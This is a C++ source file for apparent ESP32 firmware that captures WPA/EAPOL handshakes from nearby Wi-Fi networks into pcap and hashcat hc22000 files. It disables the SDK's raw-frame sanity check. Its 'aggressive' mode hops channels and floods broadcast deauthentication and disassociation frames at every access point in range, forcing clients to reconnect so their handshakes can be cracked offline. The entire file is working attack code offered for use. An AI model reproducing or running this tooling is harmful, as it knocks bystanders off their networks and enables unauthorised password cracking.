// cap/sniffer.cpp
// Promiscuous EAPOL capture -> one classic pcap per BSSID.

#include "sniffer.h"
#include "pcap.h"
#include "hc22000.h"
#include "../storage/littlefs_ops.h"
#include "../net/ap_sta.h"
#include <esp_wifi.h>
#include <WiFi.h>
#include <LittleFS.h>
#include <string.h>
#include <stdio.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
    return 0;
}

namespace Cap {

static const uint16_t FRAME_MAX = 320;
static const uint8_t  RING_SLOTS = 8;
static const uint32_t MAX_FILE_SIZE = 50 * 1024;
static const uint16_t MAX_FILES = 200;
static const uint8_t HOP_CHANNELS[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
static const uint8_t HOP_COUNT = sizeof(HOP_CHANNELS);
static const uint32_t HOP_INTERVAL_MS = 250;

struct Slot {
    uint8_t  bssid[6];
    uint8_t  station[6];
    uint16_t len;
    uint32_t ts;
    uint8_t  frame[FRAME_MAX];
};

static Slot s_ring[RING_SLOTS];
static volatile uint8_t s_write = 0;
static volatile uint8_t s_read  = 0;

static File     s_file;
static uint8_t  s_fileBssid[6];
static bool     s_fileOpen = false;
static uint32_t s_fileSize = 0;
static char     s_fileName[Storage::FILE_NAME_MAX];
static const char* const PREFIX = "/handshakes/";

static const uint8_t BEACON_SLOTS = 16;
struct BeaconSlot {
    uint8_t  bssid[6];
    uint8_t  channel;
    uint16_t len;
    uint8_t  frame[FRAME_MAX];
};
static BeaconSlot s_beacons[BEACON_SLOTS];
static uint8_t s_beaconCount = 0;
static uint8_t s_beaconClock = 0;

static Counters s_cnt = {};
static volatile bool s_running = false;
static RunMode  s_mode = RunMode::Off;
static bool     s_hopEnabled = false;
static bool     s_deauthEnabled = false;
static uint8_t  s_channelIdx = 0;
static uint32_t s_lastHopMs = 0;
static uint8_t  s_apMac[6] = {};
static uint8_t  s_bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

static void storeBeacon(const uint8_t* bssid, const uint8_t* f, uint16_t len) {
    if (!bssid || !f || len < 24) return;
    if (len > FRAME_MAX) len = FRAME_MAX;
    for (uint8_t i = 0; i < s_beaconCount; i++) {
        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) {
            memcpy(s_beacons[i].frame, f, len);
            s_beacons[i].len = len;
            s_beacons[i].channel = s_cnt.currentChannel;
            return;
        }
    }
    uint8_t idx;
    if (s_beaconCount < BEACON_SLOTS) {
        idx = s_beaconCount++;
    } else {
        idx = s_beaconClock++ % BEACON_SLOTS;
    }
    memcpy(s_beacons[idx].bssid, bssid, 6);
    memcpy(s_beacons[idx].frame, f, len);
    s_beacons[idx].len = len;
    s_beacons[idx].channel = s_cnt.currentChannel;
    Hc22000::feed(f, len);
}

static const BeaconSlot* findBeacon(const uint8_t* bssid) {
    for (uint8_t i = 0; i < s_beaconCount; i++) {
        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) return &s_beacons[i];
    }
    return nullptr;
}

static void IRAM_ATTR promiscuousRxCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    if (!pkt || !s_running) return;

    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len > 4) len -= 4;
    if (len < 24) return;

    s_cnt.framesSeen++;
    const uint8_t* f = pkt->payload;

    if (type == WIFI_PKT_MGMT) {
        if ((f[0] & 0xFC) == 0x80) {
            storeBeacon(f + 16, f, len);
        }
        return;
    }
    if (type != WIFI_PKT_DATA) return;
    if ((f[0] & 0x0C) != 0x08) return;

    uint8_t toDs = (f[1] & 0x01) != 0;
    uint8_t fromDs = (f[1] & 0x02) != 0;

    const uint8_t* bssid = nullptr;
    const uint8_t* station = nullptr;
    uint16_t bodyOff = 24;
    if (toDs && !fromDs) {
        bssid   = f + 4;
        station = f + 10;
    } else if (!toDs && fromDs) {
        bssid   = f + 10;
        station = f + 4;
    } else {
        return;
    }

    bool isQosData = (f[0] & 0x80) != 0;
    if (isQosData) bodyOff += 2;
    if ((f[1] & 0x80) != 0) bodyOff += 4;

    if (bodyOff + 8 > len) return;
    if (f[bodyOff] != 0xAA || f[bodyOff + 1] != 0xAA || f[bodyOff + 2] != 0x03) return;
    uint16_t ethertype = ((uint16_t)f[bodyOff + 6] << 8) | f[bodyOff + 7];
    if (ethertype != 0x888E) return;

    s_cnt.framesEapol++;

    uint8_t next = (uint8_t)((s_write + 1) % RING_SLOTS);
    if (next == s_read) {
        s_cnt.framesDropped++;
        return;
    }
    Slot& s = s_ring[s_write];
    memcpy(s.bssid, bssid, 6);
    memcpy(s.station, station, 6);
    s.len = (len > FRAME_MAX) ? FRAME_MAX : len;
    s.ts  = millis();
    memcpy(s.frame, f, s.len);
    s_write = next;
    s_cnt.framesQueued++;
}

static void makeFilename(const uint8_t* bssid, uint8_t rot, char out[Storage::FILE_NAME_MAX]) {
    if (rot <= 1) {
        snprintf(out, Storage::FILE_NAME_MAX, "%02X-%02X-%02X-%02X-%02X-%02X.pcap",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    } else {
        snprintf(out, Storage::FILE_NAME_MAX, "%02X-%02X-%02X-%02X-%02X-%02X-%u.pcap",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], (unsigned)rot);
    }
}

static bool writePcapPacket(const uint8_t* frame, uint16_t flen, uint32_t ts) {
    Pcap::PacketHeader ph;
    ph.tsSec   = ts / 1000;
    ph.tsUsec  = (ts % 1000) * 1000;
    ph.inclLen = Pcap::RADIOTAP_LEN + flen;
    ph.origLen = ph.inclLen;
    size_t n = 0;
    n += s_file.write((uint8_t*)&ph, sizeof(ph));
    n += s_file.write(Pcap::RADIOTAP_HEADER, Pcap::RADIOTAP_LEN);
    n += s_file.write(frame, flen);
    size_t expect = sizeof(ph) + Pcap::RADIOTAP_LEN + flen;
    if (n != expect) return false;
    s_fileSize += expect;
    return true;
}

static void closeFile() {
    if (s_fileOpen) {
        s_file.flush();
        s_file.close();
        s_fileOpen = false;
    }
}

static bool openFileForBssid(const uint8_t* bssid) {
    if (s_fileOpen) closeFile();

    Storage::Stats st = Storage::stats();
    bool createdNew = false;

    for (uint8_t rot = 1; rot <= 9; rot++) {
        char name[Storage::FILE_NAME_MAX];
        makeFilename(bssid, rot, name);
        char path[48];
        snprintf(path, sizeof(path), "%s%s", PREFIX, name);

        bool exists = LittleFS.exists(path);
        if (!exists && st.handshakes >= MAX_FILES) {
            Serial.println("[CAP] handshake cap (200 files) reached");
            return false;
        }

        s_file = LittleFS.open(path, "a");
        if (!s_file) return false;

        s_fileSize = s_file.size();
        if (s_fileSize >= MAX_FILE_SIZE) {
            s_file.close();
            continue;
        }

        if (s_fileSize == 0) {
            Pcap::FileHeader fh;
            fh.magic        = 0xA1B2C3D4;
            fh.versionMajor = 2;
            fh.versionMinor = 4;
            fh.thiszone     = 0;
            fh.sigfigs      = 0;
            fh.snaplen      = 65535;
            fh.linktype     = 127;
            if (s_file.write((uint8_t*)&fh, sizeof(fh)) != sizeof(fh)) {
                s_file.close();
                return false;
            }
            s_fileSize = sizeof(fh);
            s_cnt.filesOpened++;
            createdNew = true;
        }

        memcpy(s_fileBssid, bssid, 6);
        memcpy(s_fileName, name, sizeof(s_fileName));
        s_fileOpen = true;

        if (createdNew) {
            const BeaconSlot* bcn = findBeacon(bssid);
            if (bcn) {
                writePcapPacket(bcn->frame, bcn->len, millis());
                Hc22000::feed(bcn->frame, bcn->len);
            }
        }
        return true;
    }
    return false;
}

static bool sameBssid(const uint8_t* a, const uint8_t* b) {
    return memcmp(a, b, 6) == 0;
}

static void writeFrameToFile(const Slot& s) {
    if (s_fileOpen && !sameBssid(s_fileBssid, s.bssid)) {
        closeFile();
    }
    if (s_fileOpen && s_fileSize >= MAX_FILE_SIZE) {
        closeFile();
    }
    if (!s_fileOpen) {
        if (!openFileForBssid(s.bssid)) return;
    }
    if (!writePcapPacket(s.frame, s.len, s.ts)) {
        s_cnt.framesDropped++;
        closeFile();
        return;
    }
    s_cnt.framesWritten++;
    Hc22000::feed(s.frame, s.len);
    snprintf(s_cnt.currentBssid, sizeof(s_cnt.currentBssid),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             s.bssid[0], s.bssid[1], s.bssid[2],
             s.bssid[3], s.bssid[4], s.bssid[5]);
}

static void drainRing() {
    while (s_read != s_write) {
        const Slot& s = s_ring[s_read];
        writeFrameToFile(s);
        s_read = (uint8_t)((s_read + 1) % RING_SLOTS);
    }
    if (s_fileOpen) s_file.flush();
}

static bool isOwnAp(const uint8_t* bssid) {
    return memcmp(bssid, s_apMac, 6) == 0;
}

static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid) {
    uint8_t pkt[26] = {
        fc0, 0x00,
        0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(pkt + 4, s_bcast, 6);
    memcpy(pkt + 10, bssid, 6);
    memcpy(pkt + 16, bssid, 6);
    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
    if (e != ESP_OK) e = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    if (e == ESP_OK) s_cnt.framesDeauth++;
}

static void kickOnThisChannel() {
    if (!s_deauthEnabled) return;
    if (Hc22000::shouldPauseDeauth()) return;
    uint8_t ch = s_cnt.currentChannel;
    for (uint8_t i = 0; i < s_beaconCount; i++) {
        if (s_beacons[i].channel != ch) continue;
        if (isOwnAp(s_beacons[i].bssid)) continue;
        sendRawMgmt(0xC0, s_beacons[i].bssid); // deauth
        sendRawMgmt(0xA0, s_beacons[i].bssid); // disassoc
        yield();
    }
}

void begin() {
    Storage::begin();
    Storage::ensureDir(Storage::DIR_HANDSHAKES);
    s_cnt = {};
    s_write = 0;
    s_read  = 0;
    s_running = false;
    s_mode = RunMode::Off;
    s_beaconCount = 0;
    Hc22000::reset();
}

static void startCommon(RunMode mode) {
    if (!Storage::begin()) return;
    if (s_running) stop();

    s_write = 0;
    s_read = 0;
    s_cnt = {};
    s_cnt.currentBssid[0] = 0;
    s_lastHopMs = millis();
    s_channelIdx = 0;
    s_mode = mode;
    s_hopEnabled = (mode == RunMode::Aggressive);
    s_deauthEnabled = (mode == RunMode::Aggressive);
    WiFi.softAPmacAddress(s_apMac);

    if (s_hopEnabled) {
        Net::setApSsidTemporary(Net::AP_SSID_CAP);
    }

    uint8_t ch = 0;
    wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
    esp_wifi_get_channel(&ch, &sec);
    s_cnt.currentChannel = ch ? ch : 1;

    esp_wifi_set_promiscuous_rx_cb(&promiscuousRxCb);
    esp_wifi_set_promiscuous(true);
    s_running = true;

    if (s_hopEnabled) {
        esp_wifi_set_channel(HOP_CHANNELS[0], WIFI_SECOND_CHAN_NONE);
        s_cnt.currentChannel = HOP_CHANNELS[0];
    }

    Serial.printf("[CAP] %s hop=%u deauth=%u ch=%u\n",
                  mode == RunMode::Aggressive ? "AGGRESSIVE" : "light",
                  (unsigned)s_hopEnabled, (unsigned)s_deauthEnabled,
                  (unsigned)s_cnt.currentChannel);
}

void startLight() {
    startCommon(RunMode::Light);
}

void startAggressive() {
    startCommon(RunMode::Aggressive);
}

void stop() {
    if (!s_running && s_mode == RunMode::Off) return;
    bool hopped = s_hopEnabled;
    s_running = false;
    s_deauthEnabled = false;
    s_hopEnabled = false;
    s_mode = RunMode::Off;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    drainRing();
    closeFile();
    if (hopped) Net::restoreApRadio();
    Serial.printf("[CAP] stopped seen=%u eapol=%u written=%u deauth=%u dropped=%u\n",
                  s_cnt.framesSeen, s_cnt.framesEapol,
                  s_cnt.framesWritten, s_cnt.framesDeauth,
                  s_cnt.framesDropped);
}

bool isRunning() { return s_running; }
RunMode runMode() { return s_mode; }

const Counters& counters() { return s_cnt; }

void loop() {
    if (!s_running) return;

    drainRing();

    if (!s_hopEnabled) return;
    uint32_t now = millis();
    if (now - s_lastHopMs >= HOP_INTERVAL_MS) {
        s_lastHopMs = now;
        s_channelIdx = (uint8_t)((s_channelIdx + 1) % HOP_COUNT);
        uint8_t ch = HOP_CHANNELS[s_channelIdx];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        s_cnt.currentChannel = ch;
        kickOnThisChannel();
    }
}

} // namespace Cap
